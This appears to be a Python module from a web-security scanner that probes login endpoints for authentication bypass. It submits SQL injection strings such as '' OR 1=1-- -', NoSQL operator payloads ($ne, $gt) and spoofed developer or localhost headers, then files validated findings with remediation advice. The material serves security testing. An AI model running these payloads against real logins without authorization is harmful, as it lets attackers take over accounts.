"""Login auth-bypass probe — SQL / NoSQL authentication bypass against the login endpoint.

owlforge logs in through the real browser when given --cred, so the login form itself is never
fuzzed — yet the login is one of the highest-value injection sinks (a bypass is a full
authentication bypass). This deterministic probe finds the login endpoint (a server-rendered
form discovered by credpage, or a JSON login API seen in recon) and submits classic SQL and
NoSQL auth-bypass payloads, comparing each response against a known-bad baseline.

It files a finding only when a payload flips a FAILED login into an authenticated one — a
session cookie or token appears, or a login/error response gives way to a redirect/logged-in
response — never on a guess. Read-only in intent: it attempts to log in, it never mutates data.
"""

from __future__ import annotations

import base64
import codecs
import json as _json
import re
import secrets
from collections.abc import Callable

# login endpoints by path (SPA JSON logins never surface as an HTML <form>)
_LOGIN_PATH = re.compile(r"/(?:rest/user/login|users?/sign_?in|login|signin|sign-in|"
                         r"authenticate|auth/login|session|sessions|oauth/token|account/login)\b",
                         re.I)
_JWT = re.compile(r"\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\b")
_TOKEN_KEY = re.compile(r'"(?:token|authentication|access_token|accessToken|jwt|id_token)"\s*:\s*"'
                        r'[^"]{12,}"', re.I)
_SESSION_COOKIE = re.compile(r"\b(?:sid|session|sess|connect\.sid|phpsessid|jsessionid|"
                             r"asp\.net_sessionid|laravel_session|auth|token|jwt)\s*=\s*[^;\s]{6,}",
                             re.I)
_LOGIN_MARK = re.compile(r'type=["\']?password|name=["\']?password|"(?:invalid|incorrect|'
                         r'wrong)[^"]*(?:email|password|credential)', re.I)

# username field, password field — tried in order when the real names are unknown
_USER_FIELDS = ("username", "email", "user", "login", "userid", "user_name")
_PASS_FIELDS = ("password", "pass", "passwd", "pwd")
# well-known JSON login APIs — the real login is usually an XHR the crawler never records,
# so probe these directly (a cheap liveness check skips the ones that 404 or serve the shell)
_API_LOGIN_PATHS = ("/rest/user/login", "/api/login", "/api/auth/login", "/api/v1/auth/login",
                    "/api/v1/login", "/api/sessions", "/api/session", "/auth/login",
                    "/users/login", "/user/login", "/login", "/signin", "/session",
                    "/sessions", "/oauth/token", "/account/login")

_SQLI_USERS = ("' OR 1=1-- -", "admin'-- -", "' OR '1'='1'-- -", '" OR "1"="1',
               "' OR 1=1#", "') OR ('1'='1'-- -", "admin' #")
_SQLI_PASS = "owlx"
# NoSQL operator-injection pairs (JSON logins only)
_NOSQL_PAIRS = (({"$ne": None}, {"$ne": None}), ({"$gt": ""}, {"$gt": ""}),
                ({"$ne": "owlx"}, {"$ne": "owlx"}))


def _req(sandbox, method, url, *, headers=None, body=None):
    try:
        return sandbox.http_request(method, url, headers=headers or {}, params=None,
                                    body=body, follow_redirects=False) or {}
    except TypeError:                     # older client without follow_redirects
        try:
            return sandbox.http_request(method, url, headers=headers or {}, params=None,
                                        body=body) or {}
        except Exception:
            return {}
    except Exception:
        return {}


def _hdrs(r: dict) -> dict:
    return {str(k).lower(): str(v) for k, v in (r.get("headers") or {}).items()} if r else {}


def _auth_signal(r: dict) -> set[str]:
    """Positive signals that a response represents an AUTHENTICATED session."""
    sig = set()
    if not r:
        return sig
    h = _hdrs(r)
    body = r.get("body") or ""
    st = int(r.get("status") or 0)
    sc = h.get("set-cookie", "")
    if sc and _SESSION_COOKIE.search(sc):
        sig.add("session-cookie")
    if _JWT.search(body) or _TOKEN_KEY.search(body):
        sig.add("token")
    if 300 <= st < 400:
        loc = h.get("location", "").lower()
        if loc and not any(w in loc for w in ("login", "signin", "sign-in", "error", "denied")):
            sig.add("redirect-in")
    if st == 200 and not _LOGIN_MARK.search(body) and re.search(
            r"log\s?out|sign\s?out|my account|dashboard|welcome back", body, re.I):
        sig.add("logged-in-body")
    return sig


def _hidden_fields(html: str) -> dict:
    """CSRF / hidden inputs the login form carries, so a form POST is accepted."""
    out = {}
    for m in re.finditer(r'<input\b[^>]*type=["\']?hidden["\']?[^>]*>', html or "", re.I):
        tag = m.group(0)
        n = re.search(r'name=["\']?([^"\'\s>]+)', tag)
        v = re.search(r'value=["\']?([^"\'>]*)', tag)
        if n:
            out[n.group(1)] = v.group(1) if v else ""
    # some apps name the token without type=hidden
    for m in re.finditer(r'name=["\']?(csrf[^"\'\s>]*|_token|authenticity_token)["\']?'
                         r'[^>]*value=["\']?([^"\'>]*)', html or "", re.I):
        out[m.group(1)] = m.group(2)
    return out


def _urlencode(d: dict) -> str:
    from urllib.parse import urlencode
    return urlencode(d)


def _login_targets(inventory, login_form, target=None) -> list[dict]:
    """A form login (from credpage), the well-known JSON login APIs (the real login is often an
    XHR that never lands in the crawl), plus any login-shaped endpoints seen in recon."""
    targets, seen = [], set()

    def _add(url, kind, uf=None, pf=None, page=None):
        if url and url not in seen:
            seen.add(url)
            targets.append({"url": url, "kind": kind, "user_field": uf,
                            "pass_field": pf, "page": page})

    if login_form and login_form.get("url"):
        _add(login_form.get("action") or login_form["url"], "form",
             login_form.get("user_field"), login_form.get("pass_field"), login_form["url"])
    if target:
        from urllib.parse import urlsplit
        u = urlsplit(target)
        origin = f"{u.scheme}://{u.netloc}"
        for pth in _API_LOGIN_PATHS:
            _add(origin + pth, "api")
    for it in inventory or []:
        if _LOGIN_PATH.search(it.get("url") or ""):
            _add(it["url"], "api")
    return targets


def _file(assessment_id, url, kind, payload_desc, gained, evidence):
    from owlforge.store.db import session
    from owlforge.store.models import Finding
    with session() as s:
        s.add(Finding(
            id=f"find_{secrets.token_hex(5)}", assessment_id=assessment_id,
            title=f"Authentication bypass via {kind}",
            severity="critical", status="validated", confidence="high",
            endpoint=url, method="POST",
            technical_analysis=(
                f"A login-injection payload submitted to {url} returned an AUTHENTICATED "
                f"response ({', '.join(sorted(gained))}) where a known-bad login did not. The "
                f"login query is injectable ({kind}), so authentication can be bypassed without "
                "valid credentials."),
            proof_of_concept=(f"{payload_desc}  ->  authenticated ({', '.join(sorted(gained))})"
                              f"\n\n{evidence[:1200]}"),
            impact="Full authentication bypass: an attacker logs in as a user (often the first/"
                   "admin row) with no valid credentials, then acts with that account's "
                   "privileges.",
            remediation="Use parameterized queries / an ODM that rejects operator objects; never "
                        "build the auth query from raw input. Reject non-string credential fields.",
            validation_note="login auth-bypass: payload authenticated where baseline failed "
                            "(deterministic)",
            success_signal=", ".join(sorted(gained))))
        s.commit()


# developer/backdoor headers that some apps trust for an auth shortcut (name, value)
_DEV_HEADERS = [("X-Dev-Access", "yes"), ("X-Dev-Access", "true"), ("X-Debug", "true"),
                ("X-Debug", "1"), ("X-Admin", "true"), ("X-Admin", "1"), ("X-Backdoor", "1"),
                ("X-Dev", "1"), ("X-Developer", "1"), ("X-Internal", "1"),
                ("X-Forwarded-For", "127.0.0.1"), ("X-Custom-IP-Authorization", "127.0.0.1"),
                ("X-Original-URL", "/admin")]
_HDR_KV = re.compile(r"\b(X-[A-Za-z][A-Za-z0-9-]{1,38})\s*[:=]\s*['\"]?([A-Za-z0-9._/-]{1,40})", re.I)
_HDR_NAME = re.compile(r"\b(X-[A-Za-z][A-Za-z0-9-]{1,38})\b")
_HDR_CAP = 14


def _rot13(txt: str) -> str:
    try:
        return codecs.encode(txt, "rot_13")
    except Exception:
        return ""


def _candidate_headers(html: str) -> list[tuple[str, str]]:
    """Dev/backdoor header candidates: harvested from HTML comments (raw, ROT13-decoded, and
    base64-decoded, since labs hide the hint) first, then a built-in common list."""
    out: list[tuple[str, str]] = []
    seen: set[tuple[str, str]] = set()

    def add(name: str, value: str) -> None:
        k = (name.lower(), value)
        if k not in seen:
            seen.add(k)
            out.append((name, value))

    for m in re.finditer(r"<!--(.*?)-->", html or "", re.S):
        c = m.group(1)
        variants = [c, _rot13(c)]
        for bm in re.finditer(r"[A-Za-z0-9+/]{16,}={0,2}", c):
            try:
                variants.append(base64.b64decode(bm.group(0)).decode("utf-8", "ignore"))
            except Exception:
                pass
        for v in variants:
            for kv in _HDR_KV.finditer(v):
                add(kv.group(1), kv.group(2))
            for nm in _HDR_NAME.finditer(v):
                add(nm.group(1), "yes")          # name with no value -> truthy guess
    for name, value in _DEV_HEADERS:
        add(name, value)
    return out


def _header_bypass(assessment_id, t, sandbox, root_html, log) -> bool:
    """Some logins are gated by a secret dev/backdoor HEADER (often hinted in an HTML comment),
    sometimes combined with injection. Try candidate headers against a bad login and against the
    NoSQL payloads; a header that turns a failed login into an authenticated one is the bypass."""
    url = t["url"]
    page = (root_html or "") + " " + (_req(sandbox, "GET", url).get("body") or "")
    cands = _candidate_headers(page)
    if not cands:
        return False
    rnd = secrets.token_hex(4)
    uf, pf = _field_pairs(t)[0]
    jh = {"Content-Type": "application/json"}
    bad = _json.dumps({uf: f"owl{rnd}", pf: f"owl{rnd}"})
    base = _auth_signal(_req(sandbox, "POST", url, headers=jh, body=bad))
    for hname, hval in cands[:_HDR_CAP]:
        hh = {**jh, hname: hval}
        # (a) the header alone turns a bad login into a success -> pure backdoor
        if _auth_signal(_req(sandbox, "POST", url, headers=hh, body=bad)) - base:
            _file(assessment_id, url, f"developer backdoor header ({hname}: {hval})",
                  f"header {hname}: {hval} (no valid credentials)",
                  {"backdoor-header"}, f"POST {url}\n{hname}: {hval}\n{bad}")
            return True
        # (b) the header UNLOCKS an injection that fails without it (header-gated NoSQL bypass)
        for uobj, pobj in _NOSQL_PAIRS[:2]:
            payload = _json.dumps({uf: uobj, pf: pobj})
            if _auth_signal(_req(sandbox, "POST", url, headers=jh, body=payload)) - base:
                continue                        # injection already works without the header
            if _auth_signal(_req(sandbox, "POST", url, headers=hh, body=payload)) - base:
                _file(assessment_id, url, f"header-gated NoSQL bypass ({hname})",
                      f"{hname}: {hval} + {uf}={uobj}", {"header+nosql"},
                      f"POST {url}\n{hname}: {hval}\n{payload}")
                return True
    return False


def login_authbypass_scan(assessment_id, inventory, sandbox, target, session_headers=None,
                          log: Callable[[str], None] = lambda m: None, cap: int = 12) -> int:
    """Fuzz the login endpoint(s) for SQL / NoSQL authentication bypass. Returns findings filed."""
    if sandbox is None:
        return 0
    login_form = None
    try:
        from owlforge.engine.credpage import find_login_form

        def _rf(method, url, headers=None, params=None, body=None):
            return _req(sandbox, method, url, headers=headers, body=body)
        login_form = find_login_form(target, _rf, log=lambda m: None)
    except Exception:
        login_form = None

    targets = _login_targets(inventory, login_form, target)[:cap]
    if not targets:
        return 0
    root_html = (_req(sandbox, "GET", target).get("body") or "")[:60000]
    log(f"auth-bypass: fuzzing {len(targets)} login endpoint(s) for SQL/NoSQL bypass")
    filed = 0
    for t in targets:
        if _probe_one(assessment_id, t, sandbox, log, root_html):
            filed += 1
    if filed:
        log(f"auth-bypass: {filed} authentication bypass(es) confirmed")
    return filed


def _field_pairs(t) -> list[tuple[str, str]]:
    """Credential field names to try: the discovered pair first, then common guesses. 'email'
    leads 'username' because JSON login APIs (e.g. Juice Shop) key on email."""
    pairs: list[tuple[str, str]] = []
    if t.get("user_field") and t.get("pass_field"):
        pairs.append((t["user_field"], t["pass_field"]))
    for u in ("email", "username", "user", "login"):
        if not any(u == p[0] for p in pairs):
            pairs.append((u, "password"))
    return pairs


def _probe_one(assessment_id, t, sandbox, log, root_html="") -> bool:
    url, kind = t["url"], t["kind"]

    # cheap liveness: a real JSON login API answers a bad login with a non-HTML error; skip a
    # candidate path that 404/405s or just serves the SPA shell, so many paths stay affordable.
    if kind == "api":
        probe = _req(sandbox, "POST", url, headers={"Content-Type": "application/json"},
                     body=_json.dumps({"email": "owlprobe", "password": "owlprobe"}))
        st = int(probe.get("status") or 0)
        low = (probe.get("body") or "").lower()
        if st in (0, 404, 405, 501) or "<html" in low or "<app-root" in low:
            return False

    # CSRF/hidden fields + session cookie for a server-rendered form
    hidden, cookie = {}, None
    if kind == "form" and t.get("page"):
        pg = _req(sandbox, "GET", t["page"])
        hidden = _hidden_fields(pg.get("body") or "")
        sc = _hdrs(pg).get("set-cookie", "")
        if sc:
            cookie = sc.split(";", 1)[0]
    form_hdr = {"Content-Type": "application/x-www-form-urlencoded"}
    json_hdr = {"Content-Type": "application/json"}
    if cookie:
        form_hdr["Cookie"] = cookie
        json_hdr["Cookie"] = cookie

    rnd = secrets.token_hex(4)
    for uf, pf in _field_pairs(t):
        # a wrong login must NOT look authenticated — this is the per-field-pair baseline
        if kind == "form":
            base = _auth_signal(_req(sandbox, "POST", url, headers=form_hdr,
                body=_urlencode({**hidden, uf: f"owl{rnd}", pf: f"owl{rnd}"})))
            for pl in _SQLI_USERS:
                gained = _auth_signal(_req(sandbox, "POST", url, headers=form_hdr,
                    body=_urlencode({**hidden, uf: pl, pf: _SQLI_PASS}))) - base
                if gained:
                    _file(assessment_id, url, "SQLi (form)", f"{uf}={pl!r} {pf}={_SQLI_PASS!r}",
                          gained, f"POST {url}\n{uf}={pl}&{pf}={_SQLI_PASS}")
                    return True
        jbase = _auth_signal(_req(sandbox, "POST", url, headers=json_hdr,
            body=_json.dumps({uf: f"owl{rnd}", pf: f"owl{rnd}"})))
        for pl in _SQLI_USERS:                                # SQLi strings in JSON
            gained = _auth_signal(_req(sandbox, "POST", url, headers=json_hdr,
                body=_json.dumps({uf: pl, pf: _SQLI_PASS}))) - jbase
            if gained:
                _file(assessment_id, url, "SQLi (JSON)", f"{uf}={pl!r}", gained,
                      f"POST {url}\n{_json.dumps({uf: pl, pf: _SQLI_PASS})}")
                return True
        for uobj, pobj in _NOSQL_PAIRS:                       # NoSQL operator objects in JSON
            gained = _auth_signal(_req(sandbox, "POST", url, headers=json_hdr,
                body=_json.dumps({uf: uobj, pf: pobj}))) - jbase
            if gained:
                _file(assessment_id, url, "NoSQL operator injection", f"{uf}={uobj} {pf}={pobj}",
                      gained, f"POST {url}\n{_json.dumps({uf: uobj, pf: pobj})}")
                return True
    # no credential-field injection worked — try a secret dev/backdoor HEADER
    return _header_bypass(assessment_id, t, sandbox, root_html, log)
